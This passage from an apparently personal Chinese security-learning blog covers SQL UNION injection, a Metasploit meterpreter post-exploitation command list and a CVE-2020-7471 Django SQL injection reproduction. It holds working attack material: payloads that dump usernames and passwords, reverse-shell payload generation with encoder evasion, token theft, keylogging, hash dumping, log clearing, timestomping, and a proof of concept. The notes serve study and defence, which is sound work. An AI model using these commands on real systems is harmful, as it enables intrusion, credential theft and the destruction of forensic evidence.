<h3 id="3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables"><a href="#3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables" class="headerlink" title="3.UNION attacks, where you can retrieve data from different database tables."></a>3.UNION attacks, where you can retrieve data from different database tables.</h3><p>从数据库表中检索数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常查询：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;GIFTS&#39;</span><br><span class="line">查询其他数据：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;&#39;UNION SELECT username, password FROM users--</span><br></pre></td></tr></table></figure>

<p>union对原始查询结果追加多个额外的<code>SELECT</code>查询。必须满足：</p>
<ul>
<li>各个查询列数量相同。</li>
<li>每个列中的数据类型相同。</li>
</ul>
<p>要进行union注入的前提是，知道原始查询返回的列数、原始查询中返回的哪些列的数据类型比较适合保存注入的结果。</p>
<p>首先需要确定列数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#39; ORDER BY 1--</span><br><span class="line">&#39; ORDER BY 2--</span><br><span class="line">&#39; ORDER BY 3--</span><br><span class="line">etc.</span><br><span class="line">&#x2F;&#x2F;NULL可以转换为每种常用的数据类型</span><br><span class="line">&#39; UNION SELECT NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL,NULL--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure>

<h1 id="0x03-参考："><a href="#0x03-参考：" class="headerlink" title="0x03 参考："></a>0x03 参考：</h1><p><a target="_blank" rel="noopener" href="https://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/">https://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2869">https://xz.aliyun.com/t/2869</a></p>
<p><a target="_blank" rel="noopener" href="https://tingqiao.github.io/posts/5a68b32e/">https://tingqiao.github.io/posts/5a68b32e/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5de47d05e333">https://www.jianshu.com/p/5de47d05e333</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/01/msf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/01/msf/" class="post-title-link" itemprop="url">后渗透-metasploit(MSF) meterpreter</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-01 21:50:29" itemprop="dateCreated datePublished" datetime="2021-04-01T21:50:29+08:00">2021-04-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-18 21:48:02" itemprop="dateModified" datetime="2021-06-18T21:48:02+08:00">2021-06-18</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>msf深入起来包罗万象，那我们先慢慢来认识它吧。跟着某师傅的教程熟悉一遍，并记录自己所认为最重要的东西。</p>
<h1 id="0x01-MSF基础认知"><a href="#0x01-MSF基础认知" class="headerlink" title="0x01 MSF基础认知"></a>0x01 MSF基础认知</h1><h2 id="1-体系框架"><a href="#1-体系框架" class="headerlink" title="1.体系框架"></a>1.体系框架</h2><p><img src="/2021/04/01/msf/2.png"></p>
<h2 id="2-文件系统"><a href="#2-文件系统" class="headerlink" title="2.文件系统"></a>2.文件系统</h2><p>首先要知道msf的目录位于 <strong>/usr/share/metasploit-framework</strong></p>
<p>先熟悉一下msf的重要文件系统：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">data：			Metasploit使用的可编辑文件,常用是其wordlists中的字典文件</span><br><span class="line">modules：		实际的MSF模块</span><br><span class="line">plugins：		可以在运行时加载的插件</span><br><span class="line">scripts：		Meterpreter和其他脚本</span><br><span class="line">tools：			各种有用的命令行工具</span><br><span class="line">documentation：	为框架提供文档</span><br><span class="line">external：		源代码和第三方库</span><br><span class="line">lib：			框架代码库的&#39;肉&#39;</span><br><span class="line"></span><br><span class="line">modules包括:</span><br><span class="line">    auxiliary	#漏洞辅助模块一般是没有攻击载荷的漏洞攻击</span><br><span class="line">    encoders 	#编码器模块</span><br><span class="line">    evasion	  	#简单的反杀模块</span><br><span class="line">    exploits	#渗透攻击模块</span><br><span class="line">    nops		#空指令模块</span><br><span class="line">    payloads	#漏洞负载模块</span><br></pre></td></tr></table></figure>

<h1 id="0x02-初始化"><a href="#0x02-初始化" class="headerlink" title="0x02 初始化"></a>0x02 初始化</h1><p>Metasploit使用<strong>PostgreSQL</strong>作为数据库，所以先启动postgresql.<br>并初始化数据库<br>然后以root用户打开MSF<br><img src="/2021/04/01/msf/1.jpg"></p>
<h1 id="0x03-后渗透必备命令"><a href="#0x03-后渗透必备命令" class="headerlink" title="0x03 后渗透必备命令"></a>0x03 后渗透必备命令</h1><h2 id="1）基本系统命令"><a href="#1）基本系统命令" class="headerlink" title="1）基本系统命令"></a>1）基本系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sessions -l  #列出会话id值   </span><br><span class="line">sessions -i &lt;ID值&gt;	#进入会话   </span><br><span class="line">sessions -k  #杀死会话</span><br><span class="line"></span><br><span class="line">reboot       #重启&#x2F;</span><br><span class="line">shutdown     #重启&#x2F;关机</span><br><span class="line"></span><br><span class="line">ps 			 #查看当前活跃进程    </span><br><span class="line">kill &lt;PID值&gt;  #杀死进程</span><br><span class="line"></span><br><span class="line">background 	#将当前会话放置后台</span><br><span class="line">run  		#执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info 		#查看已有模块信息</span><br><span class="line">getuid 		#查看权限 </span><br><span class="line">getpid 		#获取当前进程的pid</span><br><span class="line">sysinfo 	#查看目标机系统信息</span><br><span class="line">idletime 	#查看目标机闲置时间</span><br><span class="line">shell 		#进入目标机cmd shell</span><br></pre></td></tr></table></figure>



<h1 id="0x04-常用命令"><a href="#0x04-常用命令" class="headerlink" title="0x04 常用命令"></a>0x04 常用命令</h1><h2 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a>metasploit命令</h2><ul>
<li>help<br>打开meterpreter使用帮助。</li>
<li>run scriptname<br>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</li>
<li>sysinfo<br>列出受控主机的系统信息。</li>
<li>ls<br>列出目标主机的文件和文件夹信息。</li>
<li>use priv<br>加载特权提升扩展模块，来扩展metasploit库。</li>
<li>ps<br>显示所有运行的进程以及相关联的用户账户。</li>
<li>migrate PID<br>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</li>
<li>use incognito<br>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</li>
<li>list_tokens -u<br>列出目标主机用户的可用令牌。</li>
<li>list_tokens -g<br>列出目标主机用户组的可用令牌。</li>
<li>impersonate_token DOMAIN_NAME\USERNAME.<br>假冒目标主机上的可用令牌。</li>
<li>steal_token PID<br>盗窃给定进程的可用令牌并进行令牌假冒。</li>
<li>drop_token<br>停止假冒当前令牌。</li>
<li>getsystem<br>通过各种攻击向量来提升系统用户权限。</li>
<li>execute -f cmd.exe -i<br>执行cmd.exe命令并进行交互。</li>
<li>execute -f cmd.exe -i -t<br>以所有可用令牌来执行cmd命令并隐藏该进程。</li>
<li>rev2self<br>回到控制目标主机的初始用户账户下。</li>
<li>reg command<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</li>
<li>setdesktop number<br>切换到另一个用户界面（该功能基于那些用户已登录）。</li>
<li>screenshot<br>对目标主机的屏幕进行截图。</li>
<li>upload file<br>向目标主机上传文件。</li>
<li>download file<br>从目标主机下载文件。</li>
<li>keyscan_start<br>针对远程目标主机开启键盘记录功能。</li>
<li>keyscan_dump<br>存储目标主机上捕获的键盘记录。</li>
<li>keyscan_stop<br>停止针对目标主机的键盘记录。</li>
<li>getprivs<br>尽可能多的获取目标主机上的特权。</li>
<li>uictl enable keyboard/mouse<br>接管目标主机的键盘和鼠标。</li>
<li>background<br>将你当前的metasploit shell转为后台执行。</li>
<li>hashdump<br>导出目标主机中的口令哈希值。</li>
<li>use sniffer<br>加载嗅探模式。</li>
<li>sniffer_interfaces<br>列出目标主机所有开放的网络端口。</li>
<li>sniffer_dump interfaceID pcapname<br>在目标主机上启动嗅探。</li>
<li>sniffer_start interfaceID packet-buffer<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</li>
<li>sniffer_stats interfaceID<br>获取正在实施嗅探网络接口的统计数据。</li>
<li>sniffer_stop interfaceID<br>停止嗅探。</li>
<li>add_user username password -h ip<br>在远程目标主机上添加一个用户。</li>
<li>clearev<br>清楚目标主机上的日志记录。</li>
<li>timestomp<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</li>
<li>reboot<br>重启目标主机。</li>
</ul>
<h2 id="msfpayload命令"><a href="#msfpayload命令" class="headerlink" title="msfpayload命令"></a>msfpayload命令</h2><ul>
<li>msfpayload -h<br>msfpayload的帮助信息。</li>
<li>msfpayload windows/meterpreter/bind_tcp O<br>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</li>
</ul>
<h2 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a>msfencode命令</h2><ul>
<li>mefencode -h<br>列出msfencode的帮助命令。</li>
<li>msfencode -l<br>列出所有可用的编码器。</li>
<li>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>显示编码缓冲区的格式。</li>
<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>创建一个经过多种编码格式嵌套编码的攻击载荷。</li>
<li>msfencode -i payload.raw BufferRegister=ESI -e x86/al破解a_mixed -t c<br>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C格式输出。</li>
</ul>
<h2 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a>MSFcli命令</h2><ul>
<li>msfcli | grep exploit<br>仅列出渗透攻击模块。</li>
<li>msfcli | grep exploit/windows,<br>仅列出与windows相关的渗透攻击模块。</li>
<li>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</li>
</ul>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul>
<li>show exploits<br>列出metasploit框架中的所有渗透攻击模块。</li>
<li>show payloads<br>列出metasploit框架中的所有攻击载荷。</li>
<li>show auxiliary<br>列出metasploit框架中的所有辅助攻击载荷。</li>
<li>search name<br>查找metasploit框架中所有的渗透攻击和其他模块。</li>
<li>info<br>展示出制定渗透攻击或模块的相关信息。</li>
<li>use name<br>装载一个渗透攻击或模块。</li>
<li>LHOST<br>本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</li>
<li>RHOST<br>远程主机或是目标主机。</li>
<li>set function<br>设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>setg function<br>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>show options<br>列出某个渗透攻击或模块中所有的配置参数。</li>
<li>show targets<br>列出渗透攻击所有支持的目标平台。</li>
<li>set target num<br>指定你所知道的目标的操作系统以及补丁版本类型。</li>
<li>set payload name<br>指定想要使用的攻击载荷。</li>
<li>show advanced<br>列出所有高级配置选项。</li>
<li>set autorunscript migrate -f.<br>在渗透攻击完成后，将自动迁移到另一个进程。</li>
<li>check<br>检测目标是否选定渗透攻击存在相应的安全漏洞。</li>
<li>exploit<br>执行渗透攻击或模块来攻击目标。</li>
<li>exploit -j<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</li>
<li>exploit -z<br>渗透攻击完成后不与回话进行交互。</li>
<li>exploit -e encoder<br>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</li>
<li>exploit -h<br>列出exploit命令的帮助信息。</li>
<li>sessions -l<br>列出可用的交互会话（在处理多个shell时使用）。</li>
<li>sessions -l -v<br>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</li>
<li>sessions -s script<br>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</li>
<li>sessions -K<br>杀死所有活跃的交互会话。</li>
<li>sessions -c cmd<br>在所有活跃的metasploit会话上执行一个命令。</li>
<li>sessions -u sessionID<br>升级一个普通的win32 shell到metasploit shell。</li>
<li>db_create name<br>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</li>
<li>db_connect name<br>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</li>
<li>db_namp<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</li>
<li>db_autopwn -h<br>展示出db_autopwn命令的帮助信息。</li>
<li>db_autopwn -p -r -e<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy<br>删除当前数据库。</li>
<li>db_destroy user：passwd@host：port/database<br>使用高级选项来删除数据库。</li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34801745/article/details/110790957">https://blog.csdn.net/qq_34801745/article/details/110790957</a></li>
<li>详细章节：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34801745/article/details/110790957?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_34801745/article/details/110790957?spm=1001.2014.3001.5502</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/29/Django-sql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/29/Django-sql/" class="post-title-link" itemprop="url">Django-sql注入漏洞复现-CVE-2020-7471</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-29 19:53:21" itemprop="dateCreated datePublished" datetime="2021-03-29T19:53:21+08:00">2021-03-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-07 09:30:12" itemprop="dateModified" datetime="2021-04-07T09:30:12+08:00">2021-04-07</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Django作为开放源码的Web应用python框架，作为最有代表性的web框架，构建了多种网站和APP。Django负责处理网站开发中麻烦的部分，因此让开发者专注于应用程序的编写。其采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template），注重组件的重用性和“可插拔性”。<br><strong>原理</strong><br>通过构造分隔符，传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义符号（\）来注入恶意SQL语句。<br>漏洞的核心是StringAgg(delimiter),StringAgg聚合函数的delimiter参数存在SQL注入漏洞。</p>
<p>介绍下StringAgg，它会将输入的值使用 delimiter 分隔符级联起来。比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br></pre></td></tr></table></figure>

<p>这个查询操作就是查询 Info 对应的 postgres 数据表的 gender 列，将gender相同的 name 列使用横线连接聚合，输入如下：</p>
<p><img src="/2021/03/29/Django-sql/12.jpg"></p>
<p>漏洞位于django/django/contrib/postgres/aggregates/general.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.postgres.aggregates import StringAgg</span><br></pre></td></tr></table></figure>

<p>可以看到官方使用Value函数来防止注入，Value函数的内容如下</p>
<p><img src="/2021/03/29/Django-sql/10.jpg"></p>
<p><img src="/2021/03/29/Django-sql/11.jpg"></p>
<p>Value参数会被添加到sql参数列表，然后被Django内置的过滤机制过滤，来防注。</p>
<p>如何导致SQL 注入：<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib">contrib</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres">postgres</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres/aggregates">aggregates</a>/general.py</p>
<p><img src="/2021/03/29/Django-sql/14.jpg"></p>
<p>delimiter没有任何过滤，我们可以通过闭合单引号来利用注入</p>
<p><img src="/2021/03/29/Django-sql/4.png"></p>
<p>(此图摘自先知社区)</p>
<p>测试发现，当delimiter为单引号时，会报错。可以看出单引号未经过任何转义嵌入到了 SQL 语句中，然后需要追踪内部程序找出完整的 SQL 语句上下文。从上面的图中可以看出来，查询语句调用了self.cursor.execute，sql变量还没嵌入时，delimiter 的值如下：</p>
<p><img src="/2021/03/29/Django-sql/5.png"></p>
<p>（此图摘自先知社区）</p>
<p><img src="/2021/03/29/Django-sql/5.png"></p>
<p>运行后看到此时sql已加入delimiter为单引号的取值。因为此处sql为字符串，所以需要转义。若是postgres则会执行以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;vul_app_info&quot;.&quot;gender&quot;, STRING_AGG(&quot;vul_app_info&quot;.&quot;name&quot;, &#39;&#39;&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1</span><br></pre></td></tr></table></figure>

<p>此时三个单引号会导致语法错误，postgres的注释符为’)–。将delimiter设置为<code>&#39;)--</code>，可以成功注释from语句</p>
<p>为构造合法的上下文，将 delimiter设置为</p>
<p>**’-&#39;) AS “mydefinedname” FROM “vul_app_info” GROUP BY “vul_app_info”.”gender” LIMIT 1 OFFSET 1 – ‘  **</p>
<p>输出为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>若设置delimiter为<code>-</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delimiter&#x3D;&quot;-&quot;</span><br></pre></td></tr></table></figure>

<p>该语句使用StringAgg类，用于将输入的值使用delimiter分隔符级联。原本的语句中，查询info对应的gender列，并使用-来连接。就可以<strong>通过修改delimiter的内容来实现注入</strong>。</p>
<p>输出为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;female&#39;, &#39;mydefinedname&#39;: &#39;zhang&#39;&#125;</span><br><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;-&#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br><span class="line">   print(&quot;[+]注入后的的输出：&quot;)</span><br><span class="line">   payload &#x3D; &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br></pre></td></tr></table></figure>



<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><ul>
<li>影响版本<br>Django 1.11.x &lt; 1.11.28<br>Django 2.2.x &lt; 2.2.10<br>Django 3.0.x &lt; 3.0.3<br>Django 主开发分支<br>其中Django 1.11.28、Django 2.2.10、Django 3.0.3不受影响。</li>
<li>测试环境<br>kalil<br>Django 3.0.2<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2>pip install django==3.0.2<br>安装postgres数据库，创建数据库test,并修改数据库密码<br><img src="/2021/03/29/Django-sql/1.png"><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2></li>
</ul>
<ol>
<li>由于刚才更改了数据库密码，于是更改配置文件的数据库名称以及密码<br>进入CVE-2020-7471/sqlvul_projects/settings.py，修改数据库配置，如果之前安装postgres数据库使用的默认配置（包括密码），这里就不需修改任何任何配置.<br>此处只需修改password为刚才设置密码。<br><img src="/2021/03/29/Django-sql/2.png"><br><img src="/2021/03/29/Django-sql/3.png"></li>
<li>再利用CVE-2020-7471/manage.py初始化测试数据库test数据库中的表<br><img src="/2021/03/29/Django-sql/4.jpg"><br>初始化环境完成。</li>
<li>进入test数据库查看表<br>进入数据库<br>\c test<br>查看全部表<br>\d<br><img src="/2021/03/29/Django-sql/5.jpg"><br>查看表vul_app_info的信息<br>select * from vul_app_info;<br><img src="/2021/03/29/Django-sql/6.jpg"><br>可以看到此刻表为空</li>
<li>执行POC向数据库写入数据<br><img src="/2021/03/29/Django-sql/7.jpg"><br>若执行成功POC中将插入三条数据<br>利用CVE-2020-7471/CVE-2020-7471.py写入数据<br><img src="/2021/03/29/Django-sql/8.jpg"><br><img src="/2021/03/29/Django-sql/9.jpg"><br>写入成功。<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2>升级到Django最新版3.0.3<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3></li>
</ol>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Saferman/CVE-2020-7471">https://github.com/Saferman/CVE-2020-7471</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/255947.html">https://www.freebuf.com/vuls/255947.html</a></li>
<li><a target="_blank" rel="noopener" href="https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/">https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/28/domain/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/28/domain/" class="post-title-link" itemprop="url">域渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-28 19:57:57" itemprop="dateCreated datePublished" datetime="2021-03-28T19:57:57+08:00">2021-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 10:46:36" itemprop="dateModified" datetime="2021-07-14T10:46:36+08:00">2021-07-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E6%9C%BAVulhub/" itemprop="url" rel="index"><span itemprop="name">靶机Vulhub</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.7k</span>
            </span>
